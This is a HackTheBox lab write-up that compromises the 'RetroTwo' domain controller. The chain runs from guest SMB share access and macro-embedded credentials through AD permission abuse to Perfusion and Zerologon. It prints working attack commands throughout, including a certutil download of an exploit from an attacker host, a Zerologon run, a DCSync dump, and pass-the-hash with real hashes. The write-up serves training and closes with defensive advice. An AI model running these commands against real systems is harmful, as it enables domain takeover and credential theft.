# HTB: RetroTwo — Full Penetration Testing Writeup

**Machine Name:** RetroTwo  
**Difficulty:** Easy  
**OS:** Windows (Server 2008 R2 Datacenter SP1)  
**IP Address:** 10.129.171.9  
**Domain:** retro2.vl  
**Hostname:** BLN01  
**Author:** xct  

---

## Table of Contents

1. [Overview](#overview)
2. [Tools Required](#tools-required)
3. [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
4. [Phase 2 — SMB Enumeration & File Discovery](#phase-2--smb-enumeration--file-discovery)
5. [Phase 3 — Cracking the Access Database](#phase-3--cracking-the-access-database)
6. [Phase 4 — Extracting Credentials from VBA Macro](#phase-4--extracting-credentials-from-vba-macro)
7. [Phase 5 — Active Directory Enumeration](#phase-5--active-directory-enumeration)
8. [Phase 6 — Pre-Windows 2000 Computer Account Exploitation](#phase-6--pre-windows-2000-computer-account-exploitation)
9. [Phase 7 — GenericWrite Abuse — ADMWS01$ Password Reset](#phase-7--genericwrite-abuse--admws01-password-reset)
10. [Phase 8 — RDP Access via SERVICES Group](#phase-8--rdp-access-via-services-group)
11. [Phase 9 — Privilege Escalation](#phase-9--privilege-escalation)
    - [Method 1: Perfusion (RpcEptMapper Registry DLL Hijack)](#method-1-perfusion-rpceptmapper-registry-dll-hijack)
    - [Method 2: Zerologon (CVE-2020-1472)](#method-2-zerologon-cve-2020-1472)
12. [Flags](#flags)
13. [Attack Path Summary](#attack-path-summary)
14. [Key Takeaways](#key-takeaways)

---

## Overview

RetroTwo is an Easy-rated Windows Active Directory machine on HackTheBox. Despite being rated Easy, it covers a comprehensive range of Active Directory attack techniques. The attack chain begins with unauthenticated SMB enumeration, progresses through database cracking, credential extraction from a VBA macro, BloodHound-driven AD enumeration, Pre-Windows 2000 computer account exploitation, GenericWrite privilege abuse, and finally escalates to SYSTEM via either the Perfusion exploit (RpcEptMapper registry key DLL hijacking) or the famous Zerologon vulnerability (CVE-2020-1472).

The machine runs Windows Server 2008 R2 SP1, which is End-of-Life and receives no security patches, making it vulnerable to multiple well-known exploits.

---

## Tools Required

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `smbclient` / `nxc` (NetExec) | SMB enumeration and file access |
| `office2john` | Extract hash from MS Office files |
| `john` / `hashcat` | Password cracking |
| `olevba` (oletools) | Extract VBA macros from Office files |
| `bloodhound-ce-python` | BloodHound data collection |
| `impacket-changepasswd` | Change AD account passwords |
| `rpcclient` | RPC-based AD operations |
| `bloodyAD` | Active Directory abuse toolkit |
| `xfreerdp3` | RDP client |
| `Perfusion.exe` | RpcEptMapper registry key exploit |
| `cve-2020-1472-exploit.py` | Zerologon exploit |
| `secretsdump.py` (impacket) | DCSync / dump domain credentials |
| `wmiexec.py` (impacket) | Pass-the-hash remote shell |

---

## Phase 1 — Reconnaissance

### 1.1 Add Host to /etc/hosts

```bash
echo "10.129.171.9 BLN01.retro2.vl retro2.vl BLN01" >> /etc/hosts
```

### 1.2 Nmap Full Port Scan

```bash
nmap -p- --min-rate 5000 10.129.171.9 
```

**Open Ports:**
```
53/tcp   - DNS
88/tcp   - Kerberos
135/tcp  - MSRPC
139/tcp  - NetBIOS
389/tcp  - LDAP
445/tcp  - SMB
464/tcp  - kpasswd5
593/tcp  - RPC over HTTP
636/tcp  - LDAPS
3268/tcp - Global Catalog LDAP
3269/tcp - Global Catalog LDAPS
3389/tcp - RDP
```

### 1.3 Nmap Service & Script Scan

```bash
nmap -sV -sC --min-rate 5000 10.129.171.9 --reason
```

**Key Findings from Nmap:**
- **Domain:** retro2.vl
- **Hostname:** BLN01.retro2.vl
- **OS:** Windows Server 2008 R2 Datacenter SP1 (Build 7601) — End of Life!
- **SMB Signing:** Required (prevents relay attacks)
- **SMBv1:** Enabled
- **Guest account:** Used by SMB scripts (guest access possible)
- **Role:** Primary Domain Controller (PDC)

The presence of ports 88 (Kerberos), 389 (LDAP), 53 (DNS), and 445 (SMB) confirms this is a Windows Domain Controller. The OS being Server 2008 R2 SP1 — EOL since January 2020 — is a significant red flag indicating the system receives no security patches.

---

## Phase 2 — SMB Enumeration & File Discovery

### 2.1 Enumerate Shares as Guest

```bash
nxc smb 10.129.171.9 -u 'guest' -p '' --shares
```

**Output:**
```
SMB   10.129.171.9  445  BLN01  Share       Permissions  Remark
SMB   10.129.171.9  445  BLN01  -----       -----------  ------
SMB   10.129.171.9  445  BLN01  ADMIN$                   Remote Admin
SMB   10.129.171.9  445  BLN01  C$                       Default share
SMB   10.129.171.9  445  BLN01  IPC$                     Remote IPC
SMB   10.129.171.9  445  BLN01  NETLOGON                 Logon server share
SMB   10.129.171.9  445  BLN01  Public      READ         
SMB   10.129.171.9  445  BLN01  SYSVOL                   Logon server share
```

The `Public` share is readable by the guest account — this is a non-standard share and worth investigating immediately.

### 2.2 Connect to Public Share and Download Files

```bash
smbclient //10.129.171.9/Public -U 'guest'%''
```

Inside smbclient:
```
smb: \> recurse ON
smb: \> ls
  DB/staff.accdb    (876,544 bytes)
  Temp/             (empty)

smb: \DB\> get staff.accdb
```

An `.accdb` file (Microsoft Access Database) was found. This is a non-standard file on a domain controller and very likely contains sensitive data.

```bash
file staff.accdb
# staff.accdb: Microsoft Access Database
```

---

## Phase 3 — Cracking the Access Database

The `.accdb` file is password-protected with MS Office 2013 encryption. We need to crack it.

### 3.1 Extract the Hash

```bash
office2john staff.accdb > accdb.hash
cat accdb.hash
```

**Hash:**
```
staff.accdb:$office$*2013*100000*256*16*5736cfcbb054e749a8f303570c5c1970*1ec683f4d8c4e9faf77d3c01f2433e56*7de0d4af8c54c33be322dbc860b68b4849f811196015a3f48a424a265d018235
```

### 3.2 Crack with John the Ripper

```bash
john accdb.hash --format=office --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:**
```
class08          (?)
1g 0:00:01:03 DONE
```

**Database Password: `class08`**

### 3.3 Why This Works

The hash mode `9600` in hashcat (MS Office 2013) uses 100,000 PBKDF2 iterations with SHA-512, making it slow to brute force. However, `class08` appears in the rockyou.txt wordlist, so it was cracked in about 63 seconds using John on CPU. Using a GPU with hashcat would be significantly faster.

---

## Phase 4 — Extracting Credentials from VBA Macro

### 4.1 Using olevba to Extract VBA Code

```bash
pip install oletools --break-system-packages
olevba staff.accdb
```

### 4.2 Open in Microsoft Access (Windows VM)

Open `staff.accdb` in Microsoft Access on a Windows machine, enter password `class08`, then navigate to **Database Tools → Visual Basic** to view the embedded VBA module named "Staff".

### 4.3 VBA Code Contents

The module contains a script for LDAP authentication with hardcoded credentials:

```vba
Attribute VB_Name = "Staff"
Option Compare Database

Sub ImportStaffUsersFromLDAP()
    Dim objConnection As Object
    Dim strLDAP As String
    Dim strUser As String
    Dim strPassword As String

    strLDAP = "LDAP://OU=staff,DC=retro2,DC=vl"
    strUser = "retro2\ldapreader"
    strPassword = "ppYaVcB5R"

    Set objConnection = CreateObject("ADODB.Connection")
    objConnection.Provider = "ADsDSOObject"
    objConnection.Properties("User ID") = strUser
    objConnection.Properties("Password") = strPassword
    objConnection.Properties("Encrypt Password") = True
    objConnection.Open "Active Directory Provider"
    ' ... (imports staff from LDAP into Access table)
End Sub
```

**Extracted Credentials:**
- **Username:** `ldapreader`
- **Password:** `ppYaVcB5R`
- **Domain:** retro2.vl

This is a classic developer mistake — hardcoding service account credentials directly in application code stored on an accessible network share.

### 4.4 Validate Credentials

```bash
nxc smb 10.129.171.9 -u 'ldapreader' -p 'ppYaVcB5R' -d retro2.vl
# [+] retro2.vl\ldapreader:ppYaVcB5R

nxc ldap 10.129.171.9 -u 'ldapreader' -p 'ppYaVcB5R' -d retro2.vl
# [+] retro2.vl\ldapreader:ppYaVcB5R
```

Both SMB and LDAP confirm the credentials are valid.

---

## Phase 5 — Active Directory Enumeration

### 5.1 BloodHound Data Collection

```bash
bloodhound-ce-python -u 'ldapreader' -p 'ppYaVcB5R' -d retro2.vl \
  --zip -c All -dc BLN01.retro2.vl -ns 10.129.171.9
```

**Output Summary:**
```
Found 1 domains
Found 4 computers
Found 27 users
Found 43 groups
Found 2 GPOs
Found 2 OUs
Found 19 containers
```

Upload the resulting `.zip` file to BloodHound CE for analysis.

### 5.2 Enumerate Domain Users

```bash
nxc ldap 10.129.171.9 -u 'ldapreader' -p 'ppYaVcB5R' --users
```

Notable users found: `Administrator`, `admin`, `ldapreader`, `inventory`, and 20+ staff users.

### 5.3 Enumerate Domain Computers

```bash
nxc ldap 10.129.171.9 -u 'ldapreader' -p 'ppYaVcB5R' --computers
```

**Computers:**
```
BLN01$    - Domain Controller
ADMWS01$  - Workstation
FS01$     - File Server
FS02$     - File Server
```

### 5.4 BloodHound Analysis — Attack Path

From BloodHound analysis:

1. **Domain Computers group** has **GenericWrite** over `ADMWS01$` and `FS02$`
2. `FS01$` and `FS02$` are members of **Pre-Windows 2000 Compatible Access** group — indicating they may have default weak passwords
3. `ADMWS01$` has **AddMember** rights on the `SERVICES` group
4. `SERVICES` group is a member of **Remote Desktop Users** — granting RDP access to its members

**Attack Path:**
```
FS01$ (default password) 
  → change password → authenticate
  → GenericWrite → reset ADMWS01$ password
  → ADMWS01$ AddMember → add ldapreader to SERVICES
  → SERVICES ⊂ Remote Desktop Users
  → RDP as ldapreader → user.txt
  → Perfusion / Zerologon → SYSTEM → root.txt
```

---

## Phase 6 — Pre-Windows 2000 Computer Account Exploitation

### 6.1 Background

When a computer account is created in Active Directory with the **"Pre-Windows 2000 Compatible Access"** option enabled, it is assigned a default password equal to the lowercase version of the computer's sAMAccountName, with the trailing `$` removed.

For example:
- `FS01$` → default password: `fs01`
- `FS02$` → default password: `fs02`

This is a well-documented weakness described by TrustedSec. The account cannot log in interactively until the password has been changed (returns `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`), but it can authenticate via Kerberos.

### 6.2 Test Default Passwords

```bash
nxc smb 10.129.171.9 -u 'fs01$' -p 'fs01' -d retro2.vl
```

**Output:**
```
[-] retro2.vl\fs01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

`STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` confirms the password `fs01` is correct, but the account cannot be used for interactive logon yet. We must change the password first.

### 6.3 Change FS01$ Password

Use impacket's `changepasswd` tool to update the password via RPC-SAMR:

```bash
impacket-changepasswd retro2.vl/'fs01$':fs01@10.129.171.9 \
  -newpass NewPass123 -protocol rpc-samr
```

**Output:**
```
[*] Changing the password of retro2.vl\fs01$
[*] Connecting to DCE/RPC as retro2.vl\fs01$
[*] Password was changed successfully.
```

### 6.4 Verify FS01$ Access

```bash
nxc smb 10.129.171.9 -u 'fs01$' -p 'NewPass123' -d retro2.vl
# [+] retro2.vl\fs01$:NewPass123
```

We now have a working authenticated account as `FS01$`.

---

## Phase 7 — GenericWrite Abuse — ADMWS01$ Password Reset

### 7.1 Background

`GenericWrite` is an Active Directory permission that grants the ability to write to any non-protected attribute of an object. This includes the ability to reset the account's password using certain tools.

Since `FS01$` (as a member of Domain Computers) has `GenericWrite` over `ADMWS01$`, we can reset `ADMWS01$`'s password.

**Note:** Windows Server 2008 R2 is old and lacks modern LDAP password reset support (unicodePwd over LDAPS is unreliable). The most reliable methods are `rpcclient setuserinfo2` or `impacket-changepasswd`.

### 7.2 Reset ADMWS01$ Password via rpcclient

```bash
rpcclient -U 'retro2.vl/fs01$%NewPass123' 10.129.171.9 \
  -c "setuserinfo2 ADMWS01\$ 23 'NewPass123'"
```

No output from this command is normal — it indicates success.

### 7.3 Verify ADMWS01$ Access

```bash
nxc smb 10.129.171.9 -u 'ADMWS01$' -p 'NewPass123' -d retro2.vl
# [+] retro2.vl\ADMWS01$:NewPass123
```

We now have authenticated access as `ADMWS01$`.

---

## Phase 8 — RDP Access via SERVICES Group

### 8.1 Add ldapreader to SERVICES Group

`ADMWS01$` has `AddMember` rights on the `SERVICES` group. `SERVICES` is a member of `Remote Desktop Users`, which grants RDP access. We use `bloodyAD` to add `ldapreader` to `SERVICES`:

```bash
bloodyAD --host 10.129.171.9 -d retro2.vl \
  -u 'ADMWS01$' -p 'NewPass123' \
  add groupMember 'SERVICES' 'ldapreader'
```

**Output:**
```
[+] ldapreader added to SERVICES
```

### 8.2 Connect via RDP

```bash
xfreerdp3 /u:ldapreader /p:ppYaVcB5R /v:10.129.171.9 \
  /d:retro2.vl /cert:ignore /sec:rdp
```

Alternatively with drive mounting (for file transfer):
```bash
xfreerdp3 /u:ldapreader /p:ppYaVcB5R /v:10.129.171.9 \
  /d:retro2.vl /cert:ignore /sec:rdp \
  /drive:share,/home/kali/HTB/RetroTwo
```

With `/drive:share,<path>`, your local Kali folder is accessible inside the RDP session at `\\tsclient\share\`.

### 8.3 Get User Flag

Once logged in via RDP, open CMD:

```cmd
type C:\user.txt
```

---

## Phase 9 — Privilege Escalation

The target runs **Windows Server 2008 R2 SP1** with **Hotfix(s): N/A** — completely unpatched. Two reliable privilege escalation methods are available.

---

### Method 1: Perfusion (RpcEptMapper Registry DLL Hijack)

#### Background

Perfusion is an exploit written by itm4n (2021) that targets the `RpcEptMapper` registry key vulnerability. On Windows Server 2008 R2, low-privilege users have write access to:

```
HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance
```

Any user can:
1. Create a `Performance` subkey under `RpcEptMapper`
2. Set the `Library` value to a malicious DLL path
3. Trigger WMI performance data collection, which causes Windows to load the DLL as `NT AUTHORITY\SYSTEM`

This is a local privilege escalation — no exploit code execution required, just registry manipulation and DLL loading.

#### Step 1 — Compile Perfusion.exe

Since no pre-built binary is available, compile from source on a Windows VM:

1. Clone the repository: `https://github.com/itm4n/Perfusion`
2. Open `Perfusion.sln` in Visual Studio
3. Set configuration to **Release** (not Debug)
4. Build → Build Solution
5. Copy `Perfusion.exe` from the Release folder

#### Step 2 — Transfer Perfusion.exe to Target

From Kali, host an HTTP server:

```bash
cd /path/to/Perfusion/Release
python3 -m http.server 8080
```

On the RDP target CMD:

```cmd
certutil.exe -urlcache -f http://YOUR_KALI_IP:8080/Perfusion.exe C:\Users\ldapreader\Perfusion.exe
```

Or via RDP drive mount (if connected with `/drive:share,<path>`):

```cmd
copy \\tsclient\share\Perfusion.exe C:\Users\ldapreader\Perfusion.exe
```

#### Step 3 — Run the Exploit

In PowerShell or CMD on the RDP session:

```cmd
cd C:\Users\ldapreader
.\Perfusion.exe -c cmd -i
```

**Expected Output:**
```
[*] Created Performance DLL: C:\Users\LDAPRE~1\AppData\Local\Temp\2\performance_3032_2052_2.dll
[*] Created Performance registry key.
[*] Triggered Performance data collection.
[+] Exploit completed. Got a SYSTEM token! :)
[*] Waiting for the Trigger Thread to terminate... OK
[!] Failed to delete Performance registry key.
[*] Deleted Performance DLL.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users\ldapreader> whoami
nt authority\system
```

#### Step 4 — Read Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

### Method 2: Zerologon (CVE-2020-1472)

#### Background

Zerologon is a critical vulnerability (CVSS 10.0) disclosed by Secura in September 2020. It exploits a flaw in the **Netlogon Remote Protocol (MS-NRPC)** cryptographic implementation.

The vulnerability stems from the use of AES-CFB8 encryption with a fixed **Initialization Vector (IV) of all zeros**. Due to this, roughly 1 in 256 random plaintexts will produce an all-zero ciphertext when encrypted with an all-zero IV. An attacker can:

1. Repeatedly attempt authentication with all-zero client credentials
2. In under 256 attempts, achieve a successful authentication as any machine account
3. Use this to set the Domain Controller's machine account password to an empty string
4. DCSync the domain — dumping all password hashes
5. Pass-the-hash as Administrator for full domain compromise

This exploit requires **no prior authentication** and can be executed remotely.

**Affected Systems:** All unpatched Windows Server versions prior to the August 2020 patch (KB4557222).

#### Step 1 — Download the Exploit

```bash
git clone https://github.com/dirkjanm/CVE-2020-1472
cd CVE-2020-1472
```

#### Step 2 — Install Dependencies

```bash
# Using uv (fast Python package manager)
uv add --script cve-2020-1472-exploit.py impacket

# Or using pip
pip install impacket --break-system-packages
```

#### Step 3 — Run Zerologon Exploit

```bash
uv run --script cve-2020-1472-exploit.py bln01 10.129.171.9
```

**Output:**
```
Performing authentication attempts...
====================================================================================================
====================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

The DC machine account `BLN01$` now has an **empty password**. This allows us to authenticate as the DC itself.

#### Step 4 — DCSync — Dump All Domain Hashes

With the DC machine account having an empty password, we can perform a DCSync attack to dump all credentials from the domain:

```bash
secretsdump.py -just-dc -no-pass 'bln01$@10.129.171.9'
```

**Key Hashes Extracted:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c06552bdb50ada21a7c74536c231b848:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1e242a90fb9503f383255a4328e75756:::
admin:1000:aad3b435b51404eeaad3b435b51404ee:49c31c8f60320b9f416bc248231c008c:::
[... all 27 users and 4 computer accounts ...]
```

The `Administrator` NTLM hash is: `c06552bdb50ada21a7c74536c231b848`

#### Step 5 — Pass-the-Hash as Administrator

Using impacket's `wmiexec.py` with pass-the-hash (no password needed):

```bash
wmiexec.py -hashes :c06552bdb50ada21a7c74536c231b848 \
  retro2.vl/administrator@10.129.171.9
```

**Output:**
```
[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
C:\> whoami
retro2\administrator
```

#### Step 6 — Read Root Flag

```cmd
C:\> type C:\Users\Administrator\Desktop\root.txt
```

#### Step 7 — Restore DC Password (Important in Real Engagements!)

After exploiting Zerologon in a real engagement, **always restore the DC machine account password** to prevent breaking domain functionality:

```bash
python3 restorepassword.py retro2.vl/bln01@BLN01.retro2.vl \
  -target-ip 10.129.171.9 \
  -hexpass <original_hex_password>
```

In a CTF/lab context this is less critical, but worth knowing.

---

## Flags

| Flag | Location | Method |
|------|----------|--------|
| `user.txt` | `C:\user.txt` | RDP as ldapreader after SERVICES group membership |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` | SYSTEM via Perfusion or Administrator via Zerologon |

---

## Attack Path Summary

```
[Unauthenticated]
       │
       ▼
SMB Guest Access → Public Share → staff.accdb
       │
       ▼
office2john → john → Password: class08
       │
       ▼
olevba / Microsoft Access → VBA Macro
       │
       ▼
Credentials: ldapreader:ppYaVcB5R
       │
       ▼
BloodHound Collection → Attack Path Identified
       │
       ▼
Pre-W2000 FS01$ → Default password fs01
       │
       ▼
impacket-changepasswd → Change FS01$ password
       │
       ▼
FS01$ GenericWrite → Reset ADMWS01$ password (rpcclient setuserinfo2)
       │
       ▼
ADMWS01$ AddMember → Add ldapreader to SERVICES group (bloodyAD)
       │
       ▼
SERVICES ⊂ Remote Desktop Users → RDP as ldapreader
       │
       ├─────────────────────────────────────┐
       ▼                                     ▼
[Perfusion]                          [Zerologon CVE-2020-1472]
RpcEptMapper DLL Hijack              Empty password → DCSync
       │                                     │
       ▼                                     ▼
NT AUTHORITY\SYSTEM              Administrator NTLM hash
       │                                     │
       ▼                                     ▼
root.txt                         wmiexec PTH → root.txt
```

---

## Key Takeaways

### Vulnerabilities Exploited

| Vulnerability | Impact | Severity |
|--------------|--------|----------|
| SMB Guest Access | Unauthenticated file read | Medium |
| Hardcoded credentials in VBA macro | Domain credential exposure | High |
| Pre-Windows 2000 default computer passwords | Domain account compromise | High |
| GenericWrite over computer accounts | Password reset / lateral movement | High |
| Overly permissive group membership (SERVICES → RDP Users) | Unauthorized RDP access | Medium |
| RpcEptMapper writable registry key (Perfusion) | Local Privilege Escalation to SYSTEM | Critical |
| Zerologon (CVE-2020-1472) | Remote unauthenticated domain takeover | Critical (CVSS 10.0) |

### Defensive Recommendations

1. **Disable SMB guest access** — never allow unauthenticated share access on domain infrastructure.
2. **Never store credentials in application code** — use managed secrets solutions (Azure Key Vault, HashiCorp Vault, Windows DPAPI).
3. **Patch and upgrade EOL systems** — Windows Server 2008 R2 is EOL and receives no security updates.
4. **Apply MS-NRPC patch (KB4557222)** — fixes Zerologon.
5. **Audit Pre-Windows 2000 computer accounts** — change default passwords immediately after provisioning.
6. **Audit GenericWrite permissions** — limit which accounts have write access to other AD objects.
7. **Restrict Remote Desktop Users group membership** — regularly audit who can RDP.
8. **Monitor RpcEptMapper registry key** — alert on unexpected writes to Performance subkeys.
9. **Enforce LAPS** (Local Administrator Password Solution) — prevents reuse of computer account passwords.
10. **Enable SMB signing on all systems** — already enabled here, but important to note.

---

*Writeup completed for educational purposes. All techniques demonstrated were performed on an authorized lab environment (HackTheBox).*
